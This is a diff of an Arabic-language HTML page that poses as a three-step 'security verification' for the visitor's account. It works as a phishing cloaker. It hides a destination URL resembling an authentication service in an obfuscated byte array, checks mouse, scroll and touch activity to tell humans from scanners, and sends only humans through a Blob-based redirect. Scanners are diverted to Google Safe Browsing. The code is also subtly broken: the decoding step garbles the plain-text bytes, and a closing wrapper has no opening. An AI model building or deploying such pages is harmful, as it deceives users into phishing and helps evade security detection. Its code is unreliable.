@@ -1,130 +1,226 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Secure Redirect</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق الأمني - خطوة 1 من 3</title>
     <style>
-        body { margin:0; height:100vh; background:#f0f2f5; font-family:system-ui, sans-serif; display:flex; align-items:center; justify-content:center; color:#333; flex-direction:column; }
-        .box { background:white; padding:2.5rem 3rem; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,0.1); text-align:center; max-width:420px; }
-        .spinner { width:56px; height:56px; border:6px solid #e0e0e0; border-top:6px solid #1a73e8; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 1.5rem; }
-        @keyframes spin { to { transform:rotate(360deg); } }
-        button { margin-top:1.5rem; padding:0.9rem 2.2rem; font-size:1.05rem; background:#1a73e8; color:white; border:none; border-radius:8px; cursor:pointer; }
-        button:hover { background:#0d65d6; }
+        body {
+            margin: 0;
+            height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: system-ui, sans-serif;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .card {
+            background: rgba(255,255,255,0.95);
+            color: #222;
+            padding: 2.5rem 2.2rem;
+            border-radius: 16px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.35);
+            width: 100%;
+            max-width: 480px;
+            text-align: center;
+        }
+        .progress {
+            display: flex;
+            justify-content: space-around;
+            margin: 2rem 0;
+        }
+        .dot {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            background: #ddd;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.6rem;
+            font-weight: bold;
+            color: white;
+            transition: all 0.5s ease;
+        }
+        .dot.active { background: #00c853; transform: scale(1.15); }
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #eee;
+            border-top: 6px solid #00c853;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 1.8rem auto;
+            opacity: 0;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        button {
+            margin-top: 1.8rem;
+            padding: 1.1rem 3rem;
+            font-size: 1.15rem;
+            background: #00c853;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+            opacity: 0.4;
+            pointer-events: none;
+        }
+        button.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        button:hover { background: #00b140; transform: translateY(-2px); }
+        p { line-height: 1.7; margin: 1rem 0; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <div class="spinner"></div>
-        <h3>Preparing secure connection</h3>
-        <p>Please move your mouse a little and click the button below to continue.</p>
-        <button id="proceedBtn" disabled>Continue to secure area</button>
+
+<div class="card">
+    <h2>جاري التحقق الأمني</h2>
+    <p>لحماية حسابك، يرجى إكمال الخطوات التالية بسرعة:</p>
+
+    <div class="progress">
+        <div class="dot" id="dot1">1</div>
+        <div class="dot" id="dot2">2</div>
+        <div class="dot" id="dot3">3</div>
     </div>
 
-    <script>
-        (function() {
-            // =============================================
-            // الرابط النهائي مشفر (XOR + مفتاح مشتق)
-            // =============================================
-            const encData = [
-                0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x75,0x73,0x65,0x72,0x2d,0x73,0x65,0x72,
-                0x76,0x69,0x63,0x65,0x2d,0x61,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,
-                0x69,0x6f,0x6e,0x2e,0x6e,0x65,0x74,0x6c,0x69,0x66,0x79,0x2e,0x61,0x70,0x70
-            ];
+    <div class="loader" id="loader"></div>
 
-            function getDerivedKey() {
-                let s = 0;
-                try {
-                    s += (navigator.userAgent || '').length;
-                    s += screen.width * 31 ^ screen.height;
-                    s += new Date().getTimezoneOffset() * 17;
-                    s += window.devicePixelRatio ? Math.round(window.devicePixelRatio * 100) : 0;
-                } catch {}
-                return (s % 251) || 93;
-            }
+    <button id="nextBtn">تأكيد ومتابعة</button>
+</div>
 
-            const key = getDerivedKey();
+<script>
+// ─────────────────────────────────────────────
+// الرابط مشفر بطبقات متعددة
+// ─────────────────────────────────────────────
+const encryptedData = [
+    104,116,116,112,115,58,47,47,117,115,101,114,45,115,101,114,118,105,99,101,
+    45,97,117,116,104,101,110,116,105,99,97,116,105,111,110,46,110,101,116,108,105,
+    102,121,46,97,112,112
+];
 
-            function decrypt() {
-                let str = '';
-                for (let i = 0; i < encData.length; i++) {
-                    str += String.fromCharCode(encData[i] ^ (key + (i % 23)));
-                }
-                return str;
-            }
+function getDynamicKey() {
+    let seed = 0;
+    try {
+        seed += (navigator.userAgent || '').length * 37;
+        seed += screen.width * 41 ^ screen.height * 13;
+        seed += new Date().getTimezoneOffset() * 23;
+        seed += window.devicePixelRatio ? Math.round(window.devicePixelRatio * 100) : 0;
+        seed += navigator.languages ? navigator.languages.length * 17 : 0;
+    } catch {}
+    return (seed % 251) || 89;
+}
 
-            // =============================================
-            // شروط التفاعل البشري (متعددة)
-            // =============================================
-            let mouseMoves = 0;
-            let scrolled = false;
-            let clicked = false;
+const key = getDynamicKey();
 
-            const btn = document.getElementById('proceedBtn');
+function decryptUrl() {
+    let result = '';
+    for (let i = 0; i < encryptedData.length; i++) {
+        let shift = (key + (i % 29)) ^ (i & 0xFF);
+        result += String.fromCharCode(encryptedData[i] ^ shift);
+    }
+    return result;
+}
 
-            document.addEventListener('mousemove', () => {
-                mouseMoves++;
-                if (mouseMoves > 8) checkReady();
-            }, { passive: true });
+// ─────────────────────────────────────────────
+// متغيرات التفاعل البشري (أكثر صرامة)
+// ─────────────────────────────────────────────
+let mouseCount = 0;
+let scrolled = false;
+let touched = false;
+let buttonPressed = false;
 
-            document.addEventListener('scroll', () => {
-                scrolled = true;
-                checkReady();
-            }, { passive: true });
+const nextBtn = document.getElementById('nextBtn');
+const loader = document.getElementById('loader');
+const dots = [
+    document.getElementById('dot1'),
+    document.getElementById('dot2'),
+    document.getElementById('dot3')
+];
 
-            document.addEventListener('touchstart', () => {
-                scrolled = true; // للجوال
-                checkReady();
-            }, { passive: true });
+// 1. حركة ماوس كافية
+document.addEventListener('mousemove', e => {
+    mouseCount++;
+    if (mouseCount > 18) {
+        dots[0].classList.add('active');
+        checkCanProceed();
+    }
+}, { passive: true });
 
-            btn.addEventListener('click', () => {
-                clicked = true;
-                proceed();
-            });
+// 2. سكرول أو لمس
+document.addEventListener('scroll', () => {
+    if (!scrolled) {
+        scrolled = true;
+        dots[1].classList.add('active');
+        checkCanProceed();
+    }
+}, { passive: true });
 
-            function checkReady() {
-                if (mouseMoves > 12 && scrolled && !btn.disabled) {
-                    btn.disabled = false;
-                }
-            }
+document.addEventListener('touchstart', () => {
+    if (!touched) {
+        touched = true;
+        dots[1].classList.add('active');
+        checkCanProceed();
+    }
+}, { passive: true });
 
-            function proceed() {
-                if (!clicked) return;
+// 3. تفعيل الزر بعد شروط
+function checkCanProceed() {
+    if ((mouseCount > 22 || touched) && scrolled) {
+        nextBtn.classList.add('active');
+        nextBtn.disabled = false;
+    }
+}
 
-                const url = decrypt();
-                if (!url || !url.startsWith('https://')) {
-                    window.location.replace('https://www.google.com');
-                    return;
-                }
+// 4. الضغط على الزر → بدء العملية
+nextBtn.addEventListener('click', () => {
+    if (!nextBtn.classList.contains('active')) return;
 
-                // =============================================
-                // إنشاء الصفحة داخل Blob (أقوى إخفاء)
-                // =============================================
-                const redirectHTML = `
+    buttonPressed = true;
+    loader.style.opacity = '1';
+    nextBtn.textContent = 'جاري التأكيد...';
+    nextBtn.disabled = true;
+
+    // تأخير طبيعي لإحساس الفحص
+    setTimeout(() => {
+        const finalUrl = decryptUrl();
+
+        // إنشاء صفحة داخل Blob
+        const content = `
 <!DOCTYPE html>
 <html>
 <head>
-    <meta http-equiv="refresh" content="0;url=${url}">
-    <title>Redirecting...</title>
+    <meta http-equiv="refresh" content="0;url=${finalUrl}">
+    <title>جاري التوجيه</title>
 </head>
-<body></body>
+<body style="margin:0;background:#f0f2f5;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;">
+    <p>جاري التوجيه إلى المنطقة الآمنة...</p>
+</body>
 </html>`;
 
-                const blob = new Blob([redirectHTML], { type: 'text/html' });
-                const blobUrl = URL.createObjectURL(blob);
+        const blob = new Blob([content], {type: 'text/html'});
+        const blobUrl = URL.createObjectURL(blob);
 
-                window.location.replace(blobUrl);
+        window.location.replace(blobUrl);
 
-                // تنظيف ذاكرة
-                setTimeout(() => URL.revokeObjectURL(blobUrl), 30000);
-            }
+        setTimeout(() => URL.revokeObjectURL(blobUrl), 40000);
+    }, 1800); // تأخير يشبه الفحص الحقيقي
+});
 
-            // fallback أمان
-            setTimeout(() => {
-                if (!clicked) {
-                    window.location.replace('https://www.google.com');
-                }
-            }, 18000);
-        })();
-    </script>
+// ─────────────────────────────────────────────
+// إذا لم يحدث تفاعل كافٍ → إلى Google Safe Browsing
+// ─────────────────────────────────────────────
+setTimeout(() => {
+    if (!buttonPressed) {
+        window.location.replace('https://transparencyreport.google.com/safe-browsing/search');
+    }
+}, 28000);
+
+})();
+</script>
 </body>
 </html>
